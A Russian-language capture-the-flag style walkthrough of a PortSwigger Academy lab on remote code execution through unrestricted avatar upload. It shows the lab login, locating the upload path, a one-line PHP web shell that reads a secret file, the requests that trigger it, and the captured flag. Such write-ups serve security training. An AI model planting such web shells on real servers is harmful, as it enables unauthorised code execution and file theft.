Залогинимся под `wiener:peter` на уязвимом ресурсе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/1.%20Remote%20code%20execution%20via%20web%20shell%20upload/pics%20for%20walktrough/1.png)

Загрузим рандомную картинку в качестве своего аватара и найдем данный `POST` запрос в `Proxy` -> `HTTP history`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/1.%20Remote%20code%20execution%20via%20web%20shell%20upload/pics%20for%20walktrough/4.png)

Найдем где хранится сам загруженный аватар
```
GET /files/avatars/wolf.jpg
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/1.%20Remote%20code%20execution%20via%20web%20shell%20upload/pics%20for%20walktrough/5.png)

Далее сконфигурируем наш php shell. Создадим `exloit.php` со следующей внутрянкой
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/1.%20Remote%20code%20execution%20via%20web%20shell%20upload/pics%20for%20walktrough/6.png)

Далее через личный кабинет загрузим в качестве аватара ранее сконфигурированный `exploit.php`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/1.%20Remote%20code%20execution%20via%20web%20shell%20upload/pics%20for%20walktrough/7.png)

Исполним его улаленно послав запрос формата 
```
GET /files/avatars/exploit.php
```
В качестве ответа мы получаем секрет, который и необходимо было найти по заданию
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/1.%20Remote%20code%20execution%20via%20web%20shell%20upload/pics%20for%20walktrough/8.png)
Отправляем полученный секрет - `4OxvyEkwWq0nt8k92LALkuqTO3cDFpwB` в качестве ответа на задание, и получаем сообщение об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/1.%20Remote%20code%20execution%20via%20web%20shell%20upload/pics%20for%20walktrough/9.png)
